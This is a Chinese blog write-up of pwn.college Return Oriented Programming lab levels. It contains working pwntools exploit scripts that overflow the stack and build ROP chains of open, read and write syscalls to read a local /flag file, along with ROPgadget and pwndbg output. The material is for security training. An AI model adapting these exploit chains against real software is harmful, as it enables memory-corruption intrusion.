@@ -1,0 +1,821 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Pi.png">
+  <link rel="icon" href="/img/Pi.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Lobo Q1ng">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Return Oriented Programming一条用得很多的找gadgets的方法 1$ ROPgadget --binary rop --only &amp;#x27;pop|ret&amp;#x27; | grep &amp;#x27;eax&amp;#x27;    level1.0简单的栈溢出，直接覆盖返回地址为win函数地址即可。 level1.1win():0x4019e7，buf:0x7ffc739ba52">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college: Return Oriented Programming">
+<meta property="og:url" content="https://loboq1ng.github.io/2025/03/26/pwn-college-Return-Oriented-Programming/index.html">
+<meta property="og:site_name" content="Q1ng&#39;s blog">
+<meta property="og:description" content="Return Oriented Programming一条用得很多的找gadgets的方法 1$ ROPgadget --binary rop --only &amp;#x27;pop|ret&amp;#x27; | grep &amp;#x27;eax&amp;#x27;    level1.0简单的栈溢出，直接覆盖返回地址为win函数地址即可。 level1.1win():0x4019e7，buf:0x7ffc739ba52">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-26T02:12:18.000Z">
+<meta property="article:modified_time" content="2025-05-11T08:56:10.194Z">
+<meta property="article:author" content="Lobo Q1ng">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>pwn.college: Return Oriented Programming - Q1ng&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"loboq1ng.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Q1ng&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Townscaper.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college: Return Oriented Programming"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-26 10:12" pubdate>
+          2025年3月26日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          73 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn.college: Return Oriented Programming</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h3><p>一条用得很多的找gadgets的方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ROPgadget --binary rop --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep <span class="hljs-string">&#x27;eax&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h4><p>简单的栈溢出，直接覆盖返回地址为win函数地址即可。</p>
+<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>win():<code>0x4019e7</code>，buf:<code>0x7ffc739ba520</code>，rbp:<code>0x7ffc739ba540</code></p>
+<p>padding：<code>0x20 + 8</code></p>
+<h4 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h4><p>win_stage_1():<code>0x401cbe</code></p>
+<p>win_stage_2():<code>0x401d6b</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level2.0&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(<span class="hljs-number">0x401cbe</span>) + p64(<span class="hljs-number">0x401d6b</span>)<br>p.send(payload)<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>input_buf: <code>0x7fffca103c80</code>, rbp: <code>0x7fffca103cb0</code></p>
+<p>padding &#x3D; 0xb0 - 0x80 + 8&#x3D; 0x38</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; <span class="hljs-keyword">b </span>win_stage_1<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">2</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x401a4a</span><br>pwndbg&gt; <span class="hljs-keyword">b </span>win_stage_2<br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">3</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x401af7</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h4><p>padding &#x3D; 0x40+ 8 &#x3D; 0x48</p>
+<p>题目要求：stage1需要把参数设置为1，stage2需要把参数设置为2以此类推，总共五个stage。那么我们需要找到<code>pop rsi; ret</code>。用ROPgadget试试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level3-0:/challenge$ ROPgadget --binary ./babyrop_level3.0 --only <span class="hljs-string">&#x27;ret|pop&#x27;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>0x0000000000402663 : pop rdi ; ret<br></code></pre></td></tr></table></figure>
+
+<p>那就很简单了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level3.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span><br>stage_1 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x1</span>) + p64(<span class="hljs-number">0x401fd6</span>)<br>stage_2 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x2</span>) + p64(<span class="hljs-number">0x40227b</span>)<br>stage_3 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x3</span>) + p64(<span class="hljs-number">0x401ef4</span>)<br>stage_4 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x402195</span>)<br>stage_5 = p64(<span class="hljs-number">0x0000000000402663</span>)+ p64(<span class="hljs-number">0x5</span>) + p64(<span class="hljs-number">0x4020b2</span>)<br><br>payload = padding + stage_1 + stage_2 + stage_3 + stage_4 + stage_5<br>pause()<br>p.send(payload)<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>buf: <code>0x7ffe2d71b370</code>, rbp: <code>0x7ffe2d71b3c0</code>, padding &#x3D; <code>0xc0 - 0x70 + 8 </code> &#x3D; <code>0x58</code> </p>
+<p>gadget：<code>0x0000000000402093</code></p>
+<h4 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h4><blockquote>
+<p><strong>ASLR和PIE</strong></p>
+<p>PIE(Position-Independent Executable)是一种编译选项，使得可执行文件可以在内存任意位置运行，代码不是固定地址。工作原理：1. 使用相对地址而非绝对地址。2. 编译器生成位置无关代码，链接器生成可执行文件。 3. 加载时确定实际地址，并进行重新定位。</p>
+<p>ASLR(Address Space Layout Randomization)是一种安全技术，通过随机化进程内存布局（如栈、堆、共享库等）的地址，增加攻击者预测内存地址的难度，从而放至缓冲区溢出等攻击。工作原理：1. 随机化对象：栈、堆、共享库、内存映射等。2. 操作系统在加载程序时，随机化各内存区域的基址。3. 随机化粒度：通常以内存页（如4KB）为单位。</p>
+<p>ASLR是操作系统层面的技术，随机化内存布局。PIE是编译和链接层面的技术，生成与位置无关的代码。PIE使ASLR更有效，ASLR为PIE提供随机化支持。</p>
+</blockquote>
+<p>这题开启了ASLR。但是它给了一个[leak]，也就是把buf的地址给我们了。然后没有win函数，得自己构造了。由于之前shellcode那一章已经是很早之前做的了，有点不记得了。直接看一下shellcode的level1就行。然后就是ROPgadget找对应的指令就行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rdi&#x27;</span><br>0x00000000004026c6 : pop rdi ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rsi&#x27;</span><br>0x0000000000402981 : pop rsi ; pop r15 ; ret<br>0x00000000004026ae : pop rsi ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&#x27;rax&#x27;</span><br>0x0000000000402697 : pop rax ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;syscall&quot;</span><br>Gadgets information<br>============================================================<br>0x00000000004026b6 : syscall<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdx&quot;</span><br>0x00000000004026a7 : pop rdx ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;r10&quot;</span><br>0x00000000004026a6 : pop r10 ; ret<br></code></pre></td></tr></table></figure>
+
+<p>啥都有，IDA打开算一下padding：<code>0x60 + 8</code>&#x3D;0x68。被以前的自己所恶心了一下。以前写shellcode level1的时候图方便用的sendfile作为第二个系统调用。但是这里是不支持sendfile的，找不到这个系统调用号。因此还是得用<code>open</code>+<code>read</code>+<code>write</code>三兄弟。然后有两点值得注意：1. 经过之前的题目，很容易猜测open后的flag的fd大概率为3。2. flag的长度为0x39</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;/challenge/babyrop_level4.0&quot;</span>)<br><span class="hljs-attribute">padding</span> = b&#x27;/flag&#x27;+ p8(<span class="hljs-number">0</span>x00) + b&#x27;a&#x27;*<span class="hljs-number">0</span>x62<br><span class="hljs-attribute">p</span>.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)<br><span class="hljs-attribute">buf_addr</span> = p.recv(<span class="hljs-number">14</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;buf_addr:&quot;</span>, buf_addr)<br><span class="hljs-attribute">buf_addr</span> = p64(int(buf_addr.decode(&#x27;utf-<span class="hljs-number">8</span>&#x27;)[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>))<br><span class="hljs-attribute">pop_rdi</span> = p64(<span class="hljs-number">0</span>x4026c6)<br><span class="hljs-attribute">pop_rsi</span> = p64(<span class="hljs-number">0</span>x4026ae)<br><span class="hljs-attribute">pop_rax</span> = p64(<span class="hljs-number">0</span>x402697)<br><span class="hljs-attribute">syscall</span> = p64(<span class="hljs-number">0</span>x4026b6)<br><span class="hljs-attribute">pop_rdx</span> = p64(<span class="hljs-number">0</span>x4026a7)<br><span class="hljs-attribute">pop_r10</span> = p64(<span class="hljs-number">0</span>x4026a6)<br><span class="hljs-attribute">open_sys</span> = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0</span>x0) + pop_rax + p64(<span class="hljs-number">0</span>x2) + syscall<br><span class="hljs-attribute">read_sys</span> = pop_rax + p64(<span class="hljs-number">0</span>x0) + pop_rdi + p64(<span class="hljs-number">0</span>x3) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">1024</span>) + syscall<br><span class="hljs-attribute">write_sys</span> = pop_rdx + p64(<span class="hljs-number">0</span>x39) + pop_rax + p64(<span class="hljs-number">1</span>) + pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi + buf_addr + syscall<br><span class="hljs-attribute">payload</span> = padding + open_sys + read_sys + write_sys<br><span class="hljs-comment"># pause()</span><br><span class="hljs-attribute">p</span>.send(payload)<br><br><span class="hljs-attribute">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="level4-1"><a href="#level4-1" class="headerlink" title="level4.1"></a>level4.1</h4><p>两件事：1. 换gadgets的地址。2. 算padding</p>
+<p>即可拿到flag</p>
+<h4 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h4><p>这题没有leak了，所以不知道栈的地址。但是上一题的exp中，栈地址是为了存储”&#x2F;flag”字符串以及存储读出来的flag。那么可以写入其他可读可写的空间。用IDA pro打开，可以看到哪些字段是可写的段。选这些段的地址即可存储flag。然后为了把”&#x2F;flag”字符串写入到程序中，因此需要额外调用一个read来接收stdin，stdin就是”&#x2F;flag”。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level5.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span><br><span class="hljs-comment"># p.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)</span><br><span class="hljs-comment"># buf_addr = p.recv(14)</span><br><span class="hljs-comment"># print(&quot;buf_addr:&quot;, buf_addr)</span><br><span class="hljs-comment"># buf_addr = p64(int(buf_addr.decode(&#x27;utf-8&#x27;)[2:], 16))</span><br>buf_addr = p64(<span class="hljs-number">0x405090</span>)<br>pop_rdi = p64(<span class="hljs-number">0x00000000004026df</span>)<br>pop_rsi = p64(<span class="hljs-number">0x00000000004026ff</span>)<br>pop_rax = p64(<span class="hljs-number">0x00000000004026e8</span>)<br>syscall = p64(<span class="hljs-number">0x000000000040270f</span>)<br>pop_rdx = p64(<span class="hljs-number">0x00000000004026f0</span>)<br>open_sys = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rax + p64(<span class="hljs-number">0x2</span>) + syscall<br>read_sys = pop_rax + p64(<span class="hljs-number">0x0</span>) + pop_rdi + p64(<span class="hljs-number">0x3</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">1024</span>) + syscall<br>write_sys = pop_rdx + p64(<span class="hljs-number">0x39</span>) + pop_rax + p64(<span class="hljs-number">1</span>) + pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi + buf_addr + syscall<br>read_stdin = pop_rax + p64(<span class="hljs-number">0x0</span>) + pop_rdi + p64(<span class="hljs-number">0</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">0x6</span>) + syscall<br>payload = padding + read_stdin + open_sys + read_sys + write_sys<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + p8(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="level5-1"><a href="#level5-1" class="headerlink" title="level5.1"></a>level5.1</h4><p>查看可读可写段：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; vmmap<br><span class="hljs-attribute">LEGEND</span>: STACK | HEAP | CODE | DATA | RWX | RODATA<br>             <span class="hljs-attribute">Start</span>                End Perm     Size Offset File<br>          <span class="hljs-attribute">0x400000</span>           <span class="hljs-number">0</span>x401000 r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x401000</span>           <span class="hljs-number">0</span>x402000 r-xp     <span class="hljs-number">1000</span>   <span class="hljs-number">1000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x402000</span>           <span class="hljs-number">0</span>x403000 r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">2000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x403000</span>           <span class="hljs-number">0</span>x404000 r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">2000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x404000</span>           <span class="hljs-number">0</span>x405000 rw-p     <span class="hljs-number">1000</span>   <span class="hljs-number">3000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>         <span class="hljs-attribute">0x17fc000</span>          <span class="hljs-number">0</span>x181d000 rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [heap]</span><br>    <span class="hljs-attribute">0x7897c231d000</span>     <span class="hljs-number">0</span>x7897c233f000 r--p    <span class="hljs-number">22000</span>      <span class="hljs-number">0</span> /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c233f000</span>     <span class="hljs-number">0</span>x7897c24b7000 r-xp   <span class="hljs-number">178000</span>  <span class="hljs-number">22000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c24b7000</span>     <span class="hljs-number">0</span>x7897c2505000 r--p    <span class="hljs-number">4</span>e000 <span class="hljs-number">19</span>a000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2505000</span>     <span class="hljs-number">0</span>x7897c2509000 r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>e7000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2509000</span>     <span class="hljs-number">0</span>x7897c250b000 rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>eb000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c250b000</span>     <span class="hljs-number">0</span>x7897c2511000 rw-p     <span class="hljs-number">6000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [anon_7897c250b]</span><br>    <span class="hljs-attribute">0x7897c2520000</span>     <span class="hljs-number">0</span>x7897c2521000 r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2521000</span>     <span class="hljs-number">0</span>x7897c2544000 r-xp    <span class="hljs-number">23000</span>   <span class="hljs-number">1000</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2544000</span>     <span class="hljs-number">0</span>x7897c254c000 r--p     <span class="hljs-number">8000</span>  <span class="hljs-number">24000</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254d000</span>     <span class="hljs-number">0</span>x7897c254e000 r--p     <span class="hljs-number">1000</span>  <span class="hljs-number">2</span>c000 /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254e000</span>     <span class="hljs-number">0</span>x7897c254f000 rw-p     <span class="hljs-number">1000</span>  <span class="hljs-number">2</span>d000 /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254f000</span>     <span class="hljs-number">0</span>x7897c2550000 rw-p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [anon_7897c254f]</span><br>    <span class="hljs-attribute">0x7fff1a68e000</span>     <span class="hljs-number">0</span>x7fff1a6af000 rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [stack]</span><br>    <span class="hljs-attribute">0x7fff1a7e9000</span>     <span class="hljs-number">0</span>x7fff1a7ed000 r--p     <span class="hljs-number">4000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vvar]</span><br>    <span class="hljs-attribute">0x7fff1a7ed000</span>     <span class="hljs-number">0</span>x7fff1a7ef000 r-xp     <span class="hljs-number">2000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vdso]</span><br><span class="hljs-attribute">0xffffffffff600000</span> <span class="hljs-number">0</span>xffffffffff601000 --xp     <span 